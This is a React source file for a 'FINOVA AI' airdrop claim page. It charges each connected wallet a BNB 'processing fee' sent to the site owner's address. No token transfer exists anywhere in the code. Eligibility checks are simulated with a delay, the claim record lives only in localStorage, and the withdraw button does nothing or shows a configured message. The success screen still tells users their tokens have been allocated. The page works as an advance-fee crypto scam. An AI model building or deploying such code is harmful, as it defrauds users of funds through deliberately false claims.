// src/pages/ClaimAirdrop.jsx
import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import { ethers } from 'ethers';
import Navbar from '../components/Navbar';
import WalletModal from '../components/WalletModal';
import { useWallet } from '../contexts/WalletContext';
import { useToast } from '../components/Toast/ToastSystem';
import config from '../config';
import '../styles/ClaimAirdrop.css';

// Local storage key for claim data
const CLAIM_DATA_KEY = 'fnva_airdrop_claims';

// Helper functions for localStorage management
const getClaimData = () => {
  try {
    const data = localStorage.getItem(CLAIM_DATA_KEY);
    return data ? JSON.parse(data) : {};
  } catch (error) {
    console.error('Error reading claim data:', error);
    return {};
  }
};

const saveClaimData = (address, claimInfo) => {
  try {
    const allClaimData = getClaimData();
    allClaimData[address.toLowerCase()] = claimInfo;
    localStorage.setItem(CLAIM_DATA_KEY, JSON.stringify(allClaimData));
  } catch (error) {
    console.error('Error saving claim data:', error);
  }
};

const getUserClaimData = (address) => {
  if (!address) return null;
  const allClaimData = getClaimData();
  return allClaimData[address.toLowerCase()] || null;
};

// Simulate delay
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const ClaimAirdrop = () => {
  const [walletModalOpen, setWalletModalOpen] = useState(false);
  const [connecting, setConnecting] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [claimStatus, setClaimStatus] = useState(null);
  const [isCopied, setIsCopied] = useState(false);
  const [userClaimData, setUserClaimData] = useState(null);
  const [checkingClaims, setCheckingClaims] = useState(false);
  const [userBalance, setUserBalance] = useState('0');
  const [actualFeePaid, setActualFeePaid] = useState(null);
  const [gasUsed, setGasUsed] = useState(null);
  const [showWithdrawModal, setShowWithdrawModal] = useState(false);
  
  // Get wallet context
  const {
    account,
    provider,
    signer,
    connectMetaMask,
    connectTrustWallet,
    connectWalletConnect,
    disconnectWallet,
    formatAddress,
    loading: walletLoading,
    isCorrectNetwork,
    isMobileDevice
  } = useWallet();

  // Get toast context
  const toast = useToast();

  // Get configurable amounts from config
  const claimFeeUSD = config.FEE_SYSTEM.CLAIM_FEE_USD;
  const claimFeeInBNB = config.getClaimFeeInBNB();
  const tokenAmount = config.getDisplayTokenAmount();
  const fundReceiverAddress = config.getFundReceiverAddress();

  // Check user claim status and balance when wallet connects
  useEffect(() => {
    if (account && provider) {
      checkUserClaimStatus();
      checkUserBalance();
    } else {
      // Reset states when wallet disconnects
      setUserClaimData(null);
      setClaimStatus(null);
      setUserBalance('0');
      setActualFeePaid(null);
      setGasUsed(null);
    }
  }, [account, provider]);

  // Check user's BNB balance
  const checkUserBalance = async () => {
    if (!account || !provider) return;
    
    try {
      const balance = await provider.getBalance(account);
      const balanceInBNB = ethers.formatEther(balance);
      setUserBalance(balanceInBNB);
    } catch (error) {
      console.error('Error checking balance:', error);
    }
  };

  // Check if user has already claimed tokens
  const checkUserClaimStatus = async () => {
    if (!account) return;
    
    setCheckingClaims(true);
    
    try {
      // Add small delay to simulate checking
      await delay(800);
      
      const claimData = getUserClaimData(account);
      
      if (claimData) {
        setUserClaimData(claimData);
        setClaimStatus('already-claimed');
        setActualFeePaid(claimData.feePaidBNB || claimData.actualFeePaid || 'N/A');
        setGasUsed(claimData.gasUsed || 'N/A');
        toast.info(`Found previous claim of ${claimData.totalClaimed.toLocaleString()} FNVA tokens`, 4000);
      } else {
        setUserClaimData(null);
        setClaimStatus(null);
        setActualFeePaid(null);
        setGasUsed(null);
        toast.success(`You are eligible to claim ${tokenAmount.toLocaleString()} FNVA tokens!`, 4000);
      }
    } catch (error) {
      console.error('Error checking claim status:', error);
      toast.error('Error checking claim status', 3000);
    } finally {
      setCheckingClaims(false);
    }
  };

  // Handle wallet connect
  const handleConnectClick = () => {
    if (!account && !connecting) {
      setWalletModalOpen(true);
    }
  };

  // Handle wallet selection
  const handleWalletSelect = async (walletId) => {
    if (connecting || walletLoading) return;

    setConnecting(true);
    setWalletModalOpen(false);

    try {
      let success = false;

      switch (walletId) {
        case 'metamask':
          success = await connectMetaMask();
          break;
        case 'trust':
          success = await connectTrustWallet();
          break;
        case 'walletconnect':
          success = await connectWalletConnect();
          break;
        default:
          toast.error(`Unknown wallet type: ${walletId}`, 5000);
      }

      if (success) {
        toast.success(`Wallet connected successfully`, 3000);
      }
    } catch (error) {
      toast.error(`Failed to connect: ${error.message}`, 5000);
    } finally {
      setTimeout(() => setConnecting(false), 1000);
    }
  };

  // Handle disconnect
  const handleDisconnectWallet = () => {
    setUserClaimData(null);
    setClaimStatus(null);
    setUserBalance('0');
    setActualFeePaid(null);
    setGasUsed(null);
    disconnectWallet();
    toast.info('Wallet disconnected', 3000);
  };

  // Validate claim requirements
  const validateClaimRequirements = () => {
    if (!account) {
      toast.warning('Please connect your wallet first!', 3000);
      return false;
    }

    if (!isCorrectNetwork()) {
      toast.error('Please switch to BSC network', 5000);
      return false;
    }

    if (userClaimData) {
      toast.warning('You have already claimed your tokens!', 3000);
      return false;
    }

    // Check if fund receiver is configured
    if (!config.isValidFundReceiver()) {
      toast.error('Fund receiver not configured properly', 5000);
      return false;
    }

    // Check if user has enough BNB for fee + gas
    const requiredBNB = parseFloat(claimFeeInBNB) + config.FEE_SYSTEM.MIN_BNB_FOR_GAS;
    const userBNB = parseFloat(userBalance);

    if (userBNB < requiredBNB) {
      toast.error(`Insufficient BNB. You need at least ${requiredBNB.toFixed(4)} BNB (${claimFeeInBNB} for fee + gas)`, 8000);
      return false;
    }

    return true;
  };

  // Main claim function - just pay fee to website owner
  const claimAirdrop = async () => {
    if (!validateClaimRequirements()) return;

    setIsLoading(true);

    try {
      // Get balance before transaction
      const balanceBefore = await provider.getBalance(account);
      
      toast.info(`Processing claim... Please pay ${claimFeeInBNB} BNB ($${claimFeeUSD}) fee`, 5000);
      
      // Convert fee to wei
      const feeInWei = ethers.parseEther(claimFeeInBNB);
      
      // Get fund receiver address and ensure proper checksum format
      let fundReceiverAddr = fundReceiverAddress;
      try {
        // Convert to proper checksum format
        fundReceiverAddr = ethers.getAddress(fundReceiverAddress);
      } catch (checksumError) {
        console.warn('Address checksum conversion failed, using original address');
      }
      
      // Get gas price for accurate calculation
      const feeData = await provider.getFeeData();
      const gasPrice = feeData.gasPrice;
      
      // Create transaction to send BNB to website owner
      const transaction = {
        to: fundReceiverAddr,
        value: feeInWei,
        gasLimit: config.GAS.LIMITS.FEE_PAYMENT,
        gasPrice: gasPrice
      };

      toast.info('Please confirm the payment in your wallet', 6000);
      
      // Send transaction
      const tx = await signer.sendTransaction(transaction);
      console.log('Payment transaction sent:', tx.hash);
      
      toast.info('Payment sent! Waiting for confirmation...', 5000);
      
      // Wait for confirmation
      const receipt = await tx.wait();
      
      if (receipt.status === 1) {
        console.log('Payment confirmed:', receipt.transactionHash);
        
        // Get balance after transaction to calculate actual costs
        const balanceAfter = await provider.getBalance(account);
        const actualCostWei = balanceBefore - balanceAfter;
        const actualCostBNB = ethers.formatEther(actualCostWei);
        
        // Calculate actual gas used
        const actualGasUsed = receipt.gasUsed;
        const actualGasCost = actualGasUsed * receipt.gasPrice;
        const actualGasCostBNB = ethers.formatEther(actualGasCost);
        
        // Verify the fee amount (should be close to expected)
        const actualFeePaidBNB = parseFloat(actualCostBNB) - parseFloat(actualGasCostBNB);
        
        // Create claim record with detailed fee information
        const claimInfo = {
          totalClaimed: tokenAmount, // Use configurable token amount
          claimDate: new Date().toISOString(),
          paymentTxHash: receipt.transactionHash,
          feePaidBNB: claimFeeInBNB, // Expected fee
          actualFeePaid: actualFeePaidBNB.toFixed(6), // Actual fee paid
          feePaidUSD: claimFeeUSD, // Use configurable USD amount
          gasUsed: actualGasUsed.toString(),
          gasCostBNB: actualGasCostBNB,
          totalCostBNB: actualCostBNB,
          gasPrice: ethers.formatUnits(receipt.gasPrice, 'gwei'),
          blockNumber: receipt.blockNumber,
          fundReceiverAddress: fundReceiverAddr
        };
        
        // Save claim data
        saveClaimData(account, claimInfo);
        
        // Update component state
        setUserClaimData(claimInfo);
        setClaimStatus('success');
        setActualFeePaid(actualFeePaidBNB.toFixed(6));
        setGasUsed(actualGasUsed.toString());
        
        // Update balance
        await checkUserBalance();

        toast.success(`Payment successful! You've claimed ${tokenAmount.toLocaleString()} FNVA tokens. Total cost: ${parseFloat(actualCostBNB).toFixed(6)} BNB (Fee: ${actualFeePaidBNB.toFixed(6)} BNB + Gas: ${parseFloat(actualGasCostBNB).toFixed(6)} BNB)`, 10000);
      } else {
        throw new Error('Payment transaction failed');
      }
    } catch (error) {
      console.error('Claim error:', error);
      setClaimStatus('error');
      
      // Handle specific error types
      if (error.code === 'ACTION_REJECTED') {
        toast.warning('Transaction was rejected by user', 5000);
      } else if (error.message?.includes('insufficient funds')) {
        toast.error('Insufficient funds for payment', 5000);
      } else if (error.message?.includes('bad address checksum')) {
        toast.error('Invalid receiver address configuration. Please contact support.', 8000);
      } else {
        toast.error(`Payment failed: ${error.message}`, 6000);
      }
    } finally {
      setIsLoading(false);
    }
  };

  // Copy text to clipboard
  const copyToClipboard = (text, label = 'Text') => {
    navigator.clipboard.writeText(text).then(() => {
      toast.info(`${label} copied to clipboard!`, 3000);
    });
  };

  // Copy wallet address
  const copyAddress = () => {
    setIsCopied(true);
    setTimeout(() => setIsCopied(false), 2000);
    copyToClipboard(account, 'Address');
  };

  // Format date
  const formatDate = (dateString) => {
    return new Date(dateString).toLocaleDateString('en-US', {
      year: 'numeric',
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
  };

  // Check if user has sufficient balance
  const hasSufficientBalance = () => {
    const requiredBNB = parseFloat(claimFeeInBNB) + config.FEE_SYSTEM.MIN_BNB_FOR_GAS;
    return parseFloat(userBalance) >= requiredBNB;
  };

  // Format number for display
  const formatNumber = (num, decimals = 6) => {
    if (num === null || num === undefined || num === 'N/A') return 'N/A';
    const number = typeof num === 'string' ? parseFloat(num) : num;
    return isNaN(number) ? 'N/A' : number.toFixed(decimals);
  };

  // Handle withdrawal attempt - Check if withdrawals are enabled
  const handleWithdrawClick = () => {
    if (config.isWithdrawalEnabled()) {
      // If withdrawals are enabled, show withdrawal interface
      setShowWithdrawModal(true);
    } else {
      // If withdrawals are disabled, show the configured message
      toast.info(config.getWithdrawalMessage(), 10000);
    }
  };

  // Close withdrawal modal
  const closeWithdrawModal = () => {
    setShowWithdrawModal(false);
  };

  // Withdrawal Modal Component
  const WithdrawModal = () => {
    if (!showWithdrawModal) return null;

    return (
      <div className="withdraw-modal-overlay" onClick={closeWithdrawModal}>
        <div className="withdraw-modal-content" onClick={e => e.stopPropagation()}>
          <div className="withdraw-modal-header">
            <h3>Withdraw FNVA Tokens</h3>
            <button className="modal-close-btn" onClick={closeWithdrawModal}>×</button>
          </div>
          <div className="withdraw-modal-body">
            <div className="withdraw-info">
              <div className="withdraw-amount">
                <span className="amount">{userClaimData?.totalClaimed.toLocaleString()}</span>
                <span className="token-symbol">FNVA</span>
              </div>
              <p>Available for withdrawal</p>
            </div>
            <button className="primary-btn withdraw-confirm-btn">
              Withdraw {userClaimData?.totalClaimed.toLocaleString()} FNVA
            </button>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="airdrop-page">
      <Navbar />

      <div className="airdrop-container">
        <div className="airdrop-box glass-container">
          <div className="airdrop-header">
            <h1 className="airdrop-title">
              <span className="text-gradient">Claim Your</span> FINOVA AI Airdrop
            </h1>
            <p className="airdrop-description">
              Get your {tokenAmount.toLocaleString()} FNVA tokens by paying a processing fee of ${claimFeeUSD} ({claimFeeInBNB} BNB). 
              This fee helps us process and verify your claim.
            </p>
          </div>

          <div className="airdrop-content">
            {!account ? (
              <div className="wallet-connect-section">
                <button
                  className="primary-btn connect-wallet-btn"
                  onClick={handleConnectClick}
                  disabled={connecting || walletLoading}
                >
                  {connecting || walletLoading ? (
                    <>
                      <span className="loading-spinner"></span>
                      <span>Connecting...</span>
                    </>
                  ) : (
                    'Connect Wallet'
                  )}
                </button>
              </div>
            ) : (
              <div className="wallet-connected-section">
                <div className="wallet-info">
                  <div className="wallet-address">
                    <span className="wallet-label">Connected Wallet:</span>
                    <div className="address-container">
                      <span className="address-text">{formatAddress(account)}</span>
                      <button className="copy-address-btn" onClick={copyAddress}>
                        {isCopied ? 'Copied!' : 'Copy'}
                      </button>
                    </div>
                  </div>
                  <div className="wallet-balance">
                    <span className="balance-label">BNB Balance:</span>
                    <span className="balance-value">
                      {parseFloat(userBalance).toFixed(4)} BNB
                    </span>
                  </div>
                  <button className="secondary-btn disconnect-btn" onClick={handleDisconnectWallet}>
                    Disconnect
                  </button>
                </div>

                {/* Fee Information */}
                <div className="fee-info-section">
                  <div className="fee-info-card">
                    <h4>💰 Payment Required</h4>
                    <div className="fee-details">
                      <div className="fee-item">
                        <span className="fee-label">Processing Fee:</span>
                        <span className="fee-value">${claimFeeUSD} ({claimFeeInBNB} BNB)</span>
                      </div>
                      <div className="fee-item">
                        <span className="fee-label">Gas Fee (estimated):</span>
                        <span className="fee-value">~{config.FEE_SYSTEM.MIN_BNB_FOR_GAS} BNB</span>
                      </div>
                      <div className="fee-item">
                        <span className="fee-label">Total Required:</span>
                        <span className="fee-value total">
                          ~{(parseFloat(claimFeeInBNB) + config.FEE_SYSTEM.MIN_BNB_FOR_GAS).toFixed(4)} BNB
                        </span>
                      </div>
                    </div>
                    
                    {!hasSufficientBalance() && (
                      <div className="insufficient-balance-warning">
                        ⚠️ Insufficient BNB balance. Please add more BNB to your wallet.
                      </div>
                    )}
                  </div>
                </div>

                {/* User Claim Status Indicator */}
                {checkingClaims ? (
                  <div className="claim-status-indicator checking">
                    <div className="loading-spinner"></div>
                    <span>Checking claim status...</span>
                  </div>
                ) : userClaimData ? (
                  <div className="claim-status-indicator claimed">
                    <div className="status-icon">✓</div>
                    <div className="status-info">
                      <span className="status-text">
                        You claimed <strong>{userClaimData.totalClaimed.toLocaleString()} FNVA</strong>
                      </span>
                      <span className="status-date">on {formatDate(userClaimData.claimDate)}</span>
                      <div className="fee-breakdown">
                        <span className="fee-paid">
                          <strong>Fee Paid:</strong> {formatNumber(userClaimData.actualFeePaid || userClaimData.feePaidBNB)} BNB
                        </span>
                        {userClaimData.gasCostBNB && (
                          <span className="gas-paid">
                            <strong>Gas Cost:</strong> {formatNumber(userClaimData.gasCostBNB)} BNB
                          </span>
                        )}
                        {userClaimData.totalCostBNB && (
                          <span className="total-paid">
                            <strong>Total Cost:</strong> {formatNumber(userClaimData.totalCostBNB)} BNB
                          </span>
                        )}
                      </div>
                    </div>
                  </div>
                ) : (
                  <div className="claim-status-indicator eligible">
                    <div className="status-icon">🎁</div>
                    <div className="status-info">
                      <span className="status-text">You're eligible to claim <strong>{tokenAmount.toLocaleString()} FNVA</strong></span>
                    </div>
                  </div>
                )}

                <div className="claim-section">
                  {claimStatus === null && !userClaimData && (
                    <div className="claim-info">
                      <h3>You are eligible for:</h3>
                      <div className="token-amount">
                        <span className="amount">{tokenAmount.toLocaleString()}</span>
                        <span className="token-name">FNVA Tokens</span>
                      </div>
                      
                      <div className="payment-notice">
                        <p>💡 Pay ${claimFeeUSD} processing fee to claim your tokens</p>
                      </div>
                      
                      <button
                        className="primary-btn claim-btn"
                        onClick={claimAirdrop}
                        disabled={isLoading || !hasSufficientBalance()}
                      >
                        {isLoading ? (
                          <>
                            <span className="loading-spinner"></span>
                            <span>Processing Payment...</span>
                          </>
                        ) : (
                          `Pay ${claimFeeInBNB} BNB & Claim`
                        )}
                      </button>
                    </div>
                  )}

                  {claimStatus === 'success' && (
                    <div className="claim-success">
                      <div className="success-icon">✓</div>
                      <h3>Payment Successful!</h3>
                      <p>Your payment has been processed and {tokenAmount.toLocaleString()} FNVA tokens have been allocated to your wallet.</p>
                      
                      <div className="transaction-info">
                        <div className="tx-row">
                          <span>Payment Transaction:</span>
                          <span 
                            className="tx-hash clickable"
                            onClick={() => copyToClipboard(userClaimData?.paymentTxHash, 'Payment transaction hash')}
                            title="Click to copy"
                          >
                            {userClaimData?.paymentTxHash?.slice(0, 10)}...{userClaimData?.paymentTxHash?.slice(-8)}
                          </span>
                        </div>
                        {userClaimData?.blockNumber && (
                          <div className="tx-row">
                            <span>Block Number:</span>
                            <span>{userClaimData.blockNumber}</span>
                          </div>
                        )}
                      </div>

                      <div className="payment-summary">
                        <div className="payment-details">
                          <p><strong>Processing Fee:</strong> {formatNumber(userClaimData?.actualFeePaid || userClaimData?.feePaidBNB)} BNB (${userClaimData?.feePaidUSD})</p>
                          {userClaimData?.gasCostBNB && (
                            <p><strong>Gas Cost:</strong> {formatNumber(userClaimData.gasCostBNB)} BNB</p>
                          )}
                          {userClaimData?.totalCostBNB && (
                            <p><strong>Total Cost:</strong> {formatNumber(userClaimData.totalCostBNB)} BNB</p>
                          )}
                          <p><strong>Tokens Claimed:</strong> {userClaimData?.totalClaimed.toLocaleString()} FNVA</p>
                          {userClaimData?.gasUsed && (
                            <p><strong>Gas Used:</strong> {parseInt(userClaimData.gasUsed).toLocaleString()} units</p>
                          )}
                          {userClaimData?.gasPrice && (
                            <p><strong>Gas Price:</strong> {parseFloat(userClaimData.gasPrice).toFixed(2)} Gwei</p>
                          )}
                        </div>
                        
                        <div className="action-buttons">
                          <button 
                            className="secondary-btn withdraw-btn"
                            onClick={handleWithdrawClick}
                            title="Withdraw your FNVA tokens"
                          >
                            💰 Withdraw Tokens
                          </button>
                        </div>
                      </div>
                    </div>
                  )}

                  {claimStatus === 'already-claimed' && !isLoading && (
                    <div className="claim-already">
                      <div className="already-icon">!</div>
                      <h3>Already Claimed</h3>
                      <p>You have already claimed your FNVA tokens on {formatDate(userClaimData.claimDate)}.</p>
                      
                      <div className="claim-details">
                        <div className="claim-summary">
                          <p><strong>Tokens Claimed:</strong> {userClaimData.totalClaimed.toLocaleString()} FNVA</p>
                          <p><strong>Processing Fee:</strong> {formatNumber(userClaimData.actualFeePaid || userClaimData.feePaidBNB)} BNB (${userClaimData.feePaidUSD})</p>
                          {userClaimData.gasCostBNB && (
                            <p><strong>Gas Cost:</strong> {formatNumber(userClaimData.gasCostBNB)} BNB</p>
                          )}
                          {userClaimData.totalCostBNB && (
                            <p><strong>Total Cost:</strong> {formatNumber(userClaimData.totalCostBNB)} BNB</p>
                          )}
                          {userClaimData.gasUsed && (
                            <p><strong>Gas Used:</strong> {parseInt(userClaimData.gasUsed).toLocaleString()} units</p>
                          )}
                          {userClaimData.gasPrice && (
                            <p><strong>Gas Price:</strong> {parseFloat(userClaimData.gasPrice).toFixed(2)} Gwei</p>
                          )}
                          <div className="withdraw-action">
                            <button 
                              className="withdraw-btn-small"
                              onClick={handleWithdrawClick}
                              title="Withdraw your FNVA tokens"
                            >
                              💰 Withdraw Tokens
                            </button>
                          </div>
                        </div>
                      </div>

                      <div className="transaction-info">
                        <div className="tx-row">
                          <span>Payment Transaction:</span>
                          <span 
                            className="tx-hash clickable"
                            onClick={() => copyToClipboard(userClaimData?.paymentTxHash, 'Payment transaction hash')}
                            title="Click to copy"
                          >
                            {userClaimData?.paymentTxHash?.slice(0, 10)}...{userClaimData?.paymentTxHash?.slice(-8)}
                          </span>
                        </div>
                        {userClaimData?.blockNumber && (
                          <div className="tx-row">
                            <span>Block Number:</span>
                            <span>{userClaimData.blockNumber}</span>
                          </div>
                        )}
                      </div>
                    </div>
                  )}

                  {claimStatus === 'error' && (
                    <div className="claim-error">
                      <div className="error-icon">✕</div>
                      <h3>Payment Failed</h3>
                      <p>There was an error processing your payment. Please try again.</p>
                      <button className="secondary-btn retry-btn" onClick={claimAirdrop}>
                        Try Again
                      </button>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>

          <div className="airdrop-footer">
            <div className="airdrop-steps">
              <h3>How it works:</h3>
              <div className="steps-flow">
                <div className="step-item">
                  <div className="step-icon">
                    <span className="step-number">1</span>
                  </div>
                  <span className="step-text">Connect wallet</span>
                </div>
                <div className="step-arrow">→</div>
                <div className="step-item">
                  <div className="step-icon">
                    <span className="step-number">2</span>
                  </div>
                  <span className="step-text">Pay processing fee</span>
                </div>
                <div className="step-arrow">→</div>
                <div className="step-item">
                  <div className="step-icon">
                    <span className="step-number">3</span>
                  </div>
                  <span className="step-text">Receive tokens</span>
                </div>
              </div>
            </div>

            <p className="airdrop-note">
              Processing fee: ${claimFeeUSD} per claim. Each wallet can claim once. Tokens are allocated after payment confirmation.
            </p>
          </div>
        </div>
      </div>

      {/* Wallet Selection Modal */}
      <WalletModal
        isOpen={walletModalOpen}
        onClose={() => setWalletModalOpen(false)}
        onSelect={handleWalletSelect}
      />

      {/* Withdrawal Modal */}
      <WithdrawModal />

      {/* Additional styles for withdrawal modal */}
      <style jsx>{`
        .withdraw-modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(13, 17, 33, 0.95);
          backdrop-filter: blur(15px);
          z-index: 9999;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 1rem;
        }

        .withdraw-modal-content {
          background: linear-gradient(145deg, rgba(13, 17, 33, 0.95) 0%, rgba(26, 32, 54, 0.95) 100%);
          border: 1px solid rgba(123, 140, 255, 0.2);
          border-radius: var(--border-radius-lg);
          box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
          max-width: 400px;
          width: 100%;
          padding: 0;
        }

        .withdraw-modal-header {
          display: flex;
          justify-content: space-between;
          align-items: center;
          padding: 1.5rem;
          border-bottom: 1px solid rgba(123, 140, 255, 0.1);
        }

        .withdraw-modal-header h3 {
          margin: 0;
          color: var(--text-light);
        }

        .modal-close-btn {
          background: transparent;
          border: none;
          color: var(--text-light);
          font-size: 1.5rem;
          cursor: pointer;
          padding: 0.25rem;
          border-radius: 4px;
          transition: all 0.2s ease;
        }

        .modal-close-btn:hover {
          background: rgba(123, 140, 255, 0.1);
          color: var(--accent-indigo);
        }

        .withdraw-modal-body {
          padding: 1.5rem;
          text-align: center;
        }

        .withdraw-info {
          margin-bottom: 1.5rem;
        }

        .withdraw-amount {
          display: flex;
          align-items: baseline;
          justify-content: center;
          gap: 0.5rem;
          margin-bottom: 0.5rem;
        }

        .withdraw-amount .amount {
          font-size: 2rem;
          font-weight: bold;
          color: var(--accent-indigo);
        }

        .withdraw-amount .token-symbol {
          font-size: 1.2rem;
          color: var(--text-muted);
        }

        .withdraw-confirm-btn {
          width: 100%;
          margin-top: 1rem;
        }

        .withdraw-action {
          margin-top: 15px;
          padding-top: 15px;
          border-top: 1px solid rgba(255, 255, 255, 0.1);
        }

        .withdraw-btn-small {
          background: linear-gradient(45deg, #ff6b6b 0%, #ee5a52 100%);
          color: white;
          border: none;
          padding: 8px 16px;
          border-radius: 8px;
          font-size: 0.9rem;
          font-weight: 500;
          cursor: pointer;
          transition: all 0.3s ease;
          display: inline-flex;
          align-items: center;
          gap: 6px;
        }

        .withdraw-btn-small:hover {
          transform: translateY(-1px);
          box-shadow: 0 3px 10px rgba(255, 107, 107, 0.3);
          background: linear-gradient(45deg, #ff5252 0%, #e53e3e 100%);
        }

        .withdraw-btn-small:active {
          transform: translateY(0);
        }
      `}</style>
    </div>
  );
};

export default ClaimAirdrop;